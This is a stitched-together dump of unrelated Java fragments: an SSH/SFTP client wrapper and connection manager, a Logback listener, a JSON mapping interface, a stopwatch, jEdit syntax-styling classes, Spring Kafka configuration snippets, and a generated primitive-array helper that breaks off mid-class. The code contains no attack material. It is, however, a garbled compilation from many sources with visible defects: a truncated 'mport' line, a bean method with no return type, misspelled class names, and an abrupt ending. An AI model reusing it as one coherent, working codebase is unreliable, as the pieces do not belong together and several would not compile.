        ChannelExec channel = null;
        try {
            channel = (ChannelExec) session.openChannel("exec");
            channel.setCommand(command);
            channel.setInputStream(null);
            channel.connect();
            return IOUtils.toString(channel.getInputStream(), StandardCharsets.UTF_8);
        } catch (JSchException | IOException e) {
            LOGGER.error("Fail to execute command {} on {}", command, session.getHost());
            throw new UniversalTesterException(e);
        } finally {
            if (channel != null) {
                channel.disconnect();
            }
        }
    }

    @Override
    public Path downloadFile(String distantLocation, Path targetDir) {
        createDirIfNotExists(targetDir);
        LOGGER.debug("Downloading file {} to {}", distantLocation, session.getHost());
        ChannelSftp channel = null;
        try {
            channel = (ChannelSftp) session.openChannel("sftp");
            channel.setInputStream(null);
            channel.connect();
            Path target = targetDir.resolve(FilenameUtils.getName(channel.realpath(distantLocation)));
            channel.get(distantLocation, target.toString());
            LOGGER.debug("File {} downloaded", target);
            return target;
        } catch (JSchException | SftpException e) {
            LOGGER.error("Failed to download file {}", distantLocation);
            throw new UniversalTesterException(e);
        } finally {
            if (channel != null) {
                channel.disconnect();
            }
        }
    }

    private void createDirIfNotExists(Path targetDir) {
        File targetDirFile = targetDir.toFile();
        if(!targetDirFile.exists() && !targetDirFile.mkdirs()){
            throw new UncheckedIOException(new IOException(format("Fail to create directory {0}", targetDir)));
        }
    }

    @Override
    public void upload(Path toUpload, String distantRepo) {
        try (InputStream inputStream = Files.newInputStream(toUpload)) {
            this.upload(inputStream, FilenameUtils.getName(toUpload.toString()), distantRepo);
        } catch (IOException e) {
            throw new UniversalTesterException(e);
        }
    }

    private void upload(InputStream toUpload, String filename, String distantRepo) {
        LOGGER.debug("Upload input stream to {}:{}", session.getHost(), distantRepo);
        ChannelSftp channel = null;
        try {
            channel = (ChannelSftp) session.openChannel("sftp");
            channel.setInputStream(null);
            channel.connect();
            String target = distantRepo + filename;
            channel.put(toUpload, target);
            LOGGER.debug("File uploaded to {}", target);
        } catch (JSchException | SftpException e) {
            LOGGER.error("Failed to upload file {}", filename);
            throw new UniversalTesterException(e);
        } finally {
            if (channel != null) {
                channel.disconnect();
            }
        }
    }

    @Override
    public void close() {
        if (session != null && session.isConnected()) {
            session.disconnect();
        }
    }
}


import fr.onepoint.universaltester.UniversalTesterException;

import java.nio.file.Path;

public interface SSH {

    /**
     * Run to remote connection a command line.
     * @param command The command line to execute.
     * @return The message printed on standard output during execution.
     * @throws UniversalTesterException When an error occurred during execution.
     */
    String exec(String command);

    /**
     * Copy a file from remote connection to local file system.
     * @param distantLocation The path of the file on the remote file system. It can be relative or absolute.
     * @param targetDir The directory on the local file system to store the downloaded file.
     * @return The path of the copied file on the local file system.
     */
    Path downloadFile(String distantLocation, Path targetDir);

    /**
     * Copy a file frmo the local file system to the remote file system.
     * @param toUpload The file to upload.
     * @param distantRepo The path of the directory on the remote file system to store the uploaded file.
     */
    void upload(Path toUpload, String distantRepo);

}


import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

public class SSHManager {

    private SSHManager(){
        //To avoid instantiation
    }

    private static Map<String, CloseableSSH> sshByHost = new HashMap<>();

    /**
     * Allows to get already opened SSH connection to the specified target
     * @param host the host of the target machine
     * @param user the user used to connect
     * @param port the target port
     * @return An optional valued with the connection if it exists, an empty optional otherwise
     */
    public static Optional<SSH> getSSH(String host, String user, int port){
        String key = getSSHKey(host, user, port);
        return Optional.ofNullable(sshByHost.get(key));
    }

    /**
     * Allows to get and manage an SSH connection to the specified target.
     * If there is already a connection matching the credentials, it will be returned.
     * A new SSH connection will be created otherwise.
     * @param host the host of the target machine
     * @param user the user used to connect
     * @param password the password to use to connect
     * @param port the target port
     * @return An ssh connection matching the credentials.
     */
    public static SSH getSSH(String host, String user, String password, int port) {
        Optional<SSH> ssh = getSSH(host,user,port);
        if(ssh.isPresent()){
            return ssh.get();
        }
        CloseableSSH newSSh = new CloseableSSH(host, user, password, port);
        sshByHost.put(getSSHKey(host, user, port), newSSh);
        return newSSh;
    }

    private static String getSSHKey(String host, String user, int port){
        return String.join(":", host, user, String.valueOf(port));
    }

    /**
     * Close specified ssh connection and remove it from manager.
     * Will do nothing if the connection doesn't exists
     * @param host the host of the ssh connection
     * @param user the user connected with
     * @param port the port connected into
     */
    public static void close(String host, String user, int port){
        String key = getSSHKey(host, user, port);
        CloseableSSH ssh = sshByHost.get(key);
        if(ssh != null){
            ssh.close();
            sshByHost.remove(key);
        }
    }


}

import ch.qos.logback.core.LogbackException;
import ch.qos.logback.core.status.Status;
import ch.qos.logback.core.status.StatusListener;

public class StrictConfigurationWarningStatusListener implements StatusListener {
    @Override
    public void addStatusEvent(Status status) {
        if (status.getEffectiveLevel() == Status.WARN) {
            // might want to consider how best to evaluate whether this is the relevant event
            // this approach is bound to a string and hence will no longer work if Logback changes this event message
            if (status.getMessage().endsWith("occurs multiple times on the classpath.")) {
                throw new LogbackException(status.getMessage());
            }
        }
    }
}


mport io.github.glytching.tranquil.exception.MappingException;

import java.io.InputStream;
import java.util.List;
import java.util.Map;

public interface MappingProvider {

  /**
   * Parse the given {@code source} into a {@link Map}.
   *
   * @param source a source string
   * @return a {@link Map} representation of the given {@code source}
   */
  List<Map<String, Object>> deserialize(String source);

  /**
   * Parse a json string encapsulated in the given {@code sourceStream} into a {@link Map}.
   *
   * @param sourceStream an input stream containing a json string
   * @param charset
   * @return a {@link Map} representation of the given {@code sourceStream}
   */
  List<Map<String, Object>> deserialize(InputStream sourceStream, String charset);

  /**
   * Convert the {@code source} to a string.
   *
   * @param source the object to be converted
   * @return a string representation of the given {@code source}
   */
  String serialize(List<Map<String, Object>> source) throws MappingException;

  /**
   * Convert the {@code source} to an instance of the given {@code targetType}.
   *
   * @param source the object to be converted
   * @param targetType the type to which the given {@code source} should be converted
   * @param <T> the mapped result type
   * @return the converted object
   */
  <T> T serialize(List<Map<String, Object>> source, Class<T> targetType);

  /**
   * Convert the {@code source} to an instance of the given {@code targetType}.
   *
   * @param source the object to be converted
   * @param targetType the type to which the given {@code source} should be converted
   * @param <T> the mapped result type
   * @return the converted object
   */
  <T> T serialize(List<Map<String, Object>> source, TypeRef<T> targetType);
}
==============================================================================================================
import org.apache.commons.lang3.builder.EqualsBuilder;
import org.apache.commons.lang3.builder.HashCodeBuilder;
import org.apache.commons.lang3.builder.ToStringBuilder;

public class SubscriptionStreamCompletedEvent extends SubscriptionEvent {

  public SubscriptionStreamCompletedEvent(String subscriptionKey) {
    super(SubscriptionEventType.STREAM_COMPLETED_EVENT, subscriptionKey);
  }

  @SuppressWarnings("EqualsWhichDoesntCheckParameterClass")
  @Override
  public boolean equals(Object obj) {
    return EqualsBuilder.reflectionEquals(this, obj);
  }

  @Override
  public int hashCode() {
    return HashCodeBuilder.reflectionHashCode(this);
  }

  @Override
  public String toString() {
    return ToStringBuilder.reflectionToString(this);
  }
}

import java.util.Optional;
import java.util.concurrent.TimeUnit;

/**
 * A simple (crude, even) stop watch implementation. Yes, there are plenty of existing stop watch
 * implementations out there but we need lap/split features.
 */
@SuppressWarnings("OptionalUsedAsFieldOrParameterType")
public class StopWatch {

  private final org.apache.commons.lang3.time.StopWatch main;
  private Optional<org.apache.commons.lang3.time.StopWatch> split;

  private StopWatch(boolean withSplits) {
    this.main = new org.apache.commons.lang3.time.StopWatch();
    main.start();
    if (withSplits) {
      this.split = Optional.of(new org.apache.commons.lang3.time.StopWatch());
      split.get().start();
    }
  }

  /**
   * Create and start a {@link StopWatch} instance.
   *
   * @return a {@link StopWatch} instance which has already been started
   */
  public static StopWatch start() {
    return new StopWatch(false);
  }

  /**
   * Create and start a {@link StopWatch} instance which can be used to gather split/lap times.
   *
   * @return a {@link StopWatch} instance which has already been started
   */
  public static StopWatch startForSplits() {
    return new StopWatch(true);
  }

  /**
   * Create a split. Note: this will throw an exception if called on a {@link StopWatch} instance
   * which was not started with {@link #startForSplits()}.
   *
   * @return the time since this watch was last split or the time since this watch was started if
   *     this is the first split
   */
  public long split() {
    if (split == null || !split.isPresent()) {
      throw new IllegalStateException(
          "You cannot split a StopWatch which has not been configured withSplits=true!");
    }

    split.get().stop();
    long time = split.get().getTime(TimeUnit.MILLISECONDS);
    split.get().reset();
    split.get().start();
    return time;
  }

  /**
   * Stop this watch.
   *
   * @return the time since this watch was started or if this watch was created for splits the time
   *     since the last split
   */
  public long stop() {
    main.stop();
    if (split != null) {
      split.get().stop();
    }
    return main.getTime(TimeUnit.MILLISECONDS);
  }
}


https://github.com/glytching/dragoman/blob/master/src/main/java/io/github/glytching/dragoman/store/mongo/MongoProviderImpl.java
==============================================================================================================
import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;

import javax.swing.text.Segment;
import javax.swing.text.TabExpander;
import javax.swing.text.Utilities;

import org.rosuda.JGR.toolkit.JGRPrefs;

/**
 * Class with several utility functions used by jEdit's syntax colorizing
 * subsystem.
 * 
 * @author Slava Pestov
 * @version $Id: SyntaxUtilities.java,v 1.9 1999/12/13 03:40:30 sp Exp $
 */
public class SyntaxUtilities {
	/**
	 * Checks if a subregion of a <code>Segment</code> is equal to a string.
	 * 
	 * @param ignoreCase
	 *            True if case should be ignored, false otherwise
	 * @param text
	 *            The segment
	 * @param offset
	 *            The offset into the segment
	 * @param match
	 *            The string to match
	 */
	public static boolean regionMatches(boolean ignoreCase, Segment text, int offset, String match) {
		int length = offset + match.length();
		char[] textArray = text.array;
		if (length > text.offset + text.count)
			return false;
		for (int i = offset, j = 0; i < length; i++, j++) {
			char c1 = textArray[i];
			char c2 = match.charAt(j);
			if (ignoreCase) {
				c1 = Character.toUpperCase(c1);
				c2 = Character.toUpperCase(c2);
			}
			if (c1 != c2)
				return false;
		}
		return true;
	}

	/**
	 * Checks if a subregion of a <code>Segment</code> is equal to a character
	 * array.
	 * 
	 * @param ignoreCase
	 *            True if case should be ignored, false otherwise
	 * @param text
	 *            The segment
	 * @param offset
	 *            The offset into the segment
	 * @param match
	 *            The character array to match
	 */
	public static boolean regionMatches(boolean ignoreCase, Segment text, int offset, char[] match) {
		int length = offset + match.length;
		char[] textArray = text.array;
		if (length > text.offset + text.count)
			return false;
		for (int i = offset, j = 0; i < length; i++, j++) {
			char c1 = textArray[i];
			char c2 = match[j];
			if (ignoreCase) {
				c1 = Character.toUpperCase(c1);
				c2 = Character.toUpperCase(c2);
			}
			if (c1 != c2)
				return false;
		}
		return true;
	}

	/**
	 * Returns the default style table. This can be passed to the
	 * <code>setStyles()</code> method of <code>SyntaxDocument</code> to use
	 * the default syntax styles.
	 */
	public static SyntaxStyle[] getDefaultSyntaxStyles() {
		SyntaxStyle[] styles = new SyntaxStyle[Token.ID_COUNT];

		styles[Token.COMMENT1] = new SyntaxStyle(JGRPrefs.COMMENTColor, JGRPrefs.COMMENT_IT, false);
		styles[Token.COMMENT2] = new SyntaxStyle(JGRPrefs.COMMENTColor, JGRPrefs.COMMENT_IT, false);
		styles[Token.KEYWORD1] = new SyntaxStyle(JGRPrefs.KEYWORDColor, false, JGRPrefs.KEYWORD_BOLD);
		styles[Token.KEYWORD2] = new SyntaxStyle(JGRPrefs.OBJECTColor, JGRPrefs.OBJECT_IT, false);
		styles[Token.KEYWORD3] = new SyntaxStyle(Color.darkGray, false, false); //not used?
		styles[Token.LITERAL1] = new SyntaxStyle(JGRPrefs.QUOTEColor, false, false);
		styles[Token.LITERAL2] = new SyntaxStyle(JGRPrefs.KEYWORDColor, false, true);
		styles[Token.LABEL] = new SyntaxStyle(new Color(0x990033), false, true);//not used?
		styles[Token.OPERATOR] = new SyntaxStyle(Color.black, false, true);
		styles[Token.INVALID] = new SyntaxStyle(Color.red, false, true);

		return styles;
	}

	/**
	 * Paints the specified line onto the graphics context. Note that this
	 * method munges the offset and count values of the segment.
	 * 
	 * @param line
	 *            The line segment
	 * @param tokens
	 *            The token list for the line
	 * @param styles
	 *            The syntax style list
	 * @param expander
	 *            The tab expander used to determine tab stops. May be null
	 * @param gfx
	 *            The graphics context
	 * @param x
	 *            The x co-ordinate
	 * @param y
	 *            The y co-ordinate
	 * @return The x co-ordinate, plus the width of the painted string
	 */
	public static int paintSyntaxLine(Segment line, Token tokens, SyntaxStyle[] styles, TabExpander expander, Graphics gfx, int x, int y) {
		Font defaultFont = gfx.getFont();
		Color defaultColor = gfx.getColor();

		int offset = 0;
		for (;;) {
			byte id = tokens.id;
			if (id == Token.END)
				break;

			int length = tokens.length;
			if (id == Token.NULL) {
				if (!defaultColor.equals(gfx.getColor()))
					gfx.setColor(defaultColor);
				if (!defaultFont.equals(gfx.getFont()))
					gfx.setFont(defaultFont);
			} else
				styles[id].setGraphicsFlags(gfx, defaultFont);

			line.count = length;
			x = Utilities.drawTabbedText(line, x, y, gfx, expander, 0);
			line.offset += length;
			offset += length;

			tokens = tokens.next;
		}

		return x;
	}

	// private members
	private SyntaxUtilities() {
	}
}

import java.awt.Color;
import java.awt.Font;
import java.awt.FontMetrics;
import java.awt.Graphics;
import java.awt.Toolkit;

/**
 * A simple text style class. It can specify the color, italic flag, and bold
 * flag of a run of text.
 * 
 * @author Slava Pestov
 * @version $Id: SyntaxStyle.java,v 1.6 1999/12/13 03:40:30 sp Exp $
 */
public class SyntaxStyle {
	/**
	 * Creates a new SyntaxStyle.
	 * 
	 * @param color
	 *            The text color
	 * @param italic
	 *            True if the text should be italics
	 * @param bold
	 *            True if the text should be bold
	 */
	public SyntaxStyle(Color color, boolean italic, boolean bold) {
		this.color = color;
		this.italic = italic;
		this.bold = bold;
	}

	/**
	 * Returns the color specified in this style.
	 */
	public Color getColor() {
		return color;
	}

	/**
	 * Returns true if no font styles are enabled.
	 */
	public boolean isPlain() {
		return !(bold || italic);
	}

	/**
	 * Returns true if italics is enabled for this style.
	 */
	public boolean isItalic() {
		return italic;
	}

	/**
	 * Returns true if boldface is enabled for this style.
	 */
	public boolean isBold() {
		return bold;
	}

	/**
	 * Returns the specified font, but with the style's bold and italic flags
	 * applied.
	 */
	public Font getStyledFont(Font font) {
		if (font == null)
			throw new NullPointerException("font param must not" + " be null");
		lastStyledFont = new Font(font.getFamily(), (bold ? Font.BOLD : 0) | (italic ? Font.ITALIC : 0), font.getSize());
		return lastStyledFont;
	}

	/**
	 * Returns the font metrics for the styled font.
	 */
	public FontMetrics getFontMetrics(Font font) {
		if (font == null)
			throw new NullPointerException("font param must not" + " be null");
		lastStyledFont = new Font(font.getFamily(), (bold ? Font.BOLD : 0) | (italic ? Font.ITALIC : 0), font.getSize());
		fontMetrics = Toolkit.getDefaultToolkit().getFontMetrics(lastStyledFont);
		return fontMetrics;
	}

	/**
	 * Sets the foreground color and font of the specified graphics context to
	 * that specified in this style.
	 * 
	 * @param gfx
	 *            The graphics context
	 * @param font
	 *            The font to add the styles to
	 */
	public void setGraphicsFlags(Graphics gfx, Font font) {
		Font _font = getStyledFont(font);
		gfx.setFont(_font);
		gfx.setColor(color);
	}

	/**
	 * Returns a string representation of this object.
	 */
	public String toString() {
		return getClass().getName() + "[color=" + color + (italic ? ",italic" : "") + (bold ? ",bold" : "") + "]";
	}

	// private members
	private Color color;

	private boolean italic;

	private boolean bold;

	private Font lastStyledFont;

	private FontMetrics fontMetrics;
}


spring.kafka.producer.value-serializer=org.springframework.kafka.support.serializer.JsonSerializer
spring.kafka.producer.properties.spring.json.type.mapping=cat:com.mycat.Cat,hat:com.myhat.Hat


senderProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);
senderProps.put(JsonSerializer.TYPE_MAPPINGS, "cat:com.mycat.Cat, hat:com.myhat.hat");
...
consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
consumerProps.put(JsonDeSerializer.TYPE_MAPPINGS, "cat:com.yourcat.Cat, hat:com.yourhat.hat");



producerProps.put(DelegatingSerializer.SERIALIZATION_SELECTOR_CONFIG,
    "thing1:com.example.MyThing1Serializer, thing2:com.example.MyThing2Serializer")

consumerProps.put(DelegatingDeserializer.SERIALIZATION_SELECTOR_CONFIG,
    "thing1:com.example.MyThing1Deserializer, thing2:com.example.MyThing2Deserializer")
==============================================================================================================
@Bean
public ConcurrentKafkaListenerContainerFactory kafkaListenerContainerFactory() {
    ConcurrentKafkaListenerContainerFactory<String, String> factory =
                new ConcurrentKafkaListenerContainerFactory<>();
    ...
    factory.getContainerProperties().setIdleEventInterval(60000L);
    ...
    return factory;
}
@Bean
public KafkaMessageListenerContainer(ConsumerFactory<String, String> consumerFactory) {
    ContainerProperties containerProps = new ContainerProperties("topic1", "topic2");
    ...
    containerProps.setIdleEventInterval(60000L);
    ...
    KafkaMessageListenerContainer<String, String> container = new KafKaMessageListenerContainer<>(...);
    return container;
}


public class Listener {

    @KafkaListener(id = "qux", topics = "annotated")
    public void listen4(@Payload String foo, Acknowledgment ack) {
        ...
    }

    @EventListener(condition = "event.listenerId.startsWith('qux-')")
    public void eventHandler(ListenerContainerIdleEvent event) {
        ...
    }
}
==============================================================================================================
/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-*\
   G E N E R A T O R   C R A F T E D
\*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-*/



import java.io.Serializable;

import java.util.Collection;

/**
 * Helper to replace reflective array access.
 */
interface ArrayType<T> {
    @SuppressWarnings("unchecked")
    static <T> ArrayType<T> obj() { return (ArrayType<T>) ObjectArrayType.INSTANCE; }

    Class<T> type();
    int lengthOf(Object array);
    T getAt(Object array, int index);

    Object empty();
    void setAt(Object array, int index, T value) throws ClassCastException;
    Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size);

    @SuppressWarnings("unchecked")
    static <T> ArrayType<T> of(Object array)  { return of((Class<T>) array.getClass().getComponentType()); }
    static <T> ArrayType<T> of(Class<T> type) { return !type.isPrimitive() ? obj() : ofPrimitive(type); }
    @SuppressWarnings("unchecked")
    static <T> ArrayType<T> ofPrimitive(Class<T> type) {
        if (boolean.class == type) {
            return (ArrayType<T>) BooleanArrayType.INSTANCE;
        } else if (byte.class == type) {
            return (ArrayType<T>) ByteArrayType.INSTANCE;
        } else if (char.class == type) {
            return (ArrayType<T>) CharArrayType.INSTANCE;
        } else if (double.class == type) {
            return (ArrayType<T>) DoubleArrayType.INSTANCE;
        } else if (float.class == type) {
            return (ArrayType<T>) FloatArrayType.INSTANCE;
        } else if (int.class == type) {
            return (ArrayType<T>) IntArrayType.INSTANCE;
        } else if (long.class == type) {
            return (ArrayType<T>) LongArrayType.INSTANCE;
        } else if (short.class == type) {
            return (ArrayType<T>) ShortArrayType.INSTANCE;
        } else {
            throw new IllegalArgumentException(String.valueOf(type));
        }
    }

    default Object newInstance(int length) { return copy(empty(), length); }

    /** System.arrayCopy with same source and destination */
    default Object copyRange(Object array, int from, int to) {
        final int length = to - from;
        return copy(array, length, from, 0, length);
    }

    /** Repeatedly group an array into equal sized sub-trees */
    default Object grouped(Object array, int groupSize) {
        final int arrayLength = lengthOf(array);
        final Object results = obj().newInstance(1 + ((arrayLength - 1) / groupSize));
        obj().setAt(results, 0, copyRange(array, 0, groupSize));

        for (int start = groupSize, i = 1; start < arrayLength; i++) {
            final int nextLength = Math.min(groupSize, arrayLength - (i * groupSize));
            obj().setAt(results, i, copyRange(array, start, start + nextLength));
            start += nextLength;
        }

        return results;
    }

    /** clone the source and set the value at the given position */
    default Object copyUpdate(Object array, int index, T element) {
        final Object copy = copy(array, index + 1);
        setAt(copy, index, element);
        return copy;
    }

    default Object copy(Object array, int minLength) {
        final int arrayLength = lengthOf(array);
        final int length = Math.max(arrayLength, minLength);
        return copy(array, length, 0, 0, arrayLength);
    }

    /** clone the source and keep everything after the index (pre-padding the values with null) */
    default Object copyDrop(Object array, int index) {
        final int length = lengthOf(array);
        return copy(array, length, index, index, length - index);
    }

    /** clone the source and keep everything before and including the index */
    default Object copyTake(Object array, int lastIndex) {
        return copyRange(array, 0, lastIndex + 1);
    }

    /** Create a single element array */
    default Object asArray(T element) {
        final Object result = newInstance(1);
        setAt(result, 0, element);
        return result;
    }

    /** Store the content of an iterator in an array */
    static Object[] asArray(java.util.Iterator<?> it, int length) {
        final Object[] array = new Object[length];
        for (int i = 0; i < length; i++) {
            array[i] = it.next();
        }
        return array;
    }

    @SuppressWarnings("unchecked")
    static <T> T asPrimitives(Class<?> primitiveClass, Iterable<?> values) {
        final Object[] array = Array.ofAll(values).toJavaArray();
        final ArrayType<T> type = of((Class<T>) primitiveClass);
        final Object results = type.newInstance(array.length);
        for (int i = 0; i < array.length; i++) {
            type.setAt(results, i, (T) array[i]);
        }
        return (T) results;
    }

    final class BooleanArrayType implements ArrayType<Boolean>, Serializable {
        private static final long serialVersionUID = 1L;
        static final BooleanArrayType INSTANCE = new BooleanArrayType();
        static final boolean[] EMPTY = new boolean[0];

        private static boolean[] cast(Object array) { return (boolean[]) array; }

        @Override
        public Class<Boolean> type() { return boolean.class; }

        @Override
        public boolean[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Boolean getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Boolean value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new boolean[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final boolean[] result = new boolean[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class ByteArrayType implements ArrayType<Byte>, Serializable {
        private static final long serialVersionUID = 1L;
        static final ByteArrayType INSTANCE = new ByteArrayType();
        static final byte[] EMPTY = new byte[0];

        private static byte[] cast(Object array) { return (byte[]) array; }

        @Override
        public Class<Byte> type() { return byte.class; }

        @Override
        public byte[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Byte getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Byte value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new byte[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final byte[] result = new byte[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class CharArrayType implements ArrayType<Character>, Serializable {
        private static final long serialVersionUID = 1L;
        static final CharArrayType INSTANCE = new CharArrayType();
        static final char[] EMPTY = new char[0];

        private static char[] cast(Object array) { return (char[]) array; }

        @Override
        public Class<Character> type() { return char.class; }

        @Override
        public char[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Character getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Character value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new char[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final char[] result = new char[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class DoubleArrayType implements ArrayType<Double>, Serializable {
        private static final long serialVersionUID = 1L;
        static final DoubleArrayType INSTANCE = new DoubleArrayType();
        static final double[] EMPTY = new double[0];

        private static double[] cast(Object array) { return (double[]) array; }

        @Override
        public Class<Double> type() { return double.class; }

        @Override
        public double[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Double getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Double value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new double[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final double[] result = new double[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class FloatArrayType implements ArrayType<Float>, Serializable {
        private static final long serialVersionUID = 1L;
        static final FloatArrayType INSTANCE = new FloatArrayType();
        static final float[] EMPTY = new float[0];

        private static float[] cast(Object array) { return (float[]) array; }

        @Override
        public Class<Float> type() { return float.class; }

        @Override
        public float[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Float getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Float value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new float[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final float[] result = new float[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class IntArrayType implements ArrayType<Integer>, Serializable {
        private static final long serialVersionUID = 1L;
        static final IntArrayType INSTANCE = new IntArrayType();
        static final int[] EMPTY = new int[0];

        private static int[] cast(Object array) { return (int[]) array; }

        @Override
        public Class<Integer> type() { return int.class; }

        @Override
        public int[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Integer getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Integer value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new int[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final int[] result = new int[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class LongArrayType implements ArrayType<Long>, Serializable {
        private static final long serialVersionUID = 1L;
        static final LongArrayType INSTANCE = new LongArrayType();
        static final long[] EMPTY = new long[0];

        private static long[] cast(Object array) { return (long[]) array; }

        @Override
        public Class<Long> type() { return long.class; }

        @Override
        public long[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Long getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Long value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new long[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final long[] result = new long[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class ShortArrayType implements ArrayType<Short>, Serializable {
        private static final long serialVersionUID = 1L;
        static final ShortArrayType INSTANCE = new ShortArrayType();
        static final short[] EMPTY = new short[0];

        private static short[] cast(Object array) { return (short[]) array; }

        @Override
        public Class<Short> type() { return short.class; }

        @Override
        public short[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Short getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Short value) throws ClassCastException {
            if (value != null) {
                cast(array)[index] = value;
            } else {
                throw new ClassCastException();
            }
        }

        @Override
        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new short[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final short[] result = new short[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }

    final class ObjectArrayType implements ArrayType<Object>, Serializable {
        private static final long serialVersionUID = 1L;
        static final ObjectArrayType INSTANCE = new ObjectArrayType();
        static final Object[] EMPTY = new Object[0];

        private static Object[] cast(Object array) { return (Object[]) array; }

        @Override
        public Class<Object> type() { return Object.class; }

        @Override
        public Object[] empty() { return EMPTY; }

        @Override
        public int lengthOf(Object array) { return (array != null) ? cast(array).length : 0; }

        @Override
        public Object getAt(Object array, int index) { return cast(array)[index]; }

        @Override
        public void setAt(Object array, int index, Object value) {
            cast(array)[index] = value;
        }

        @Override
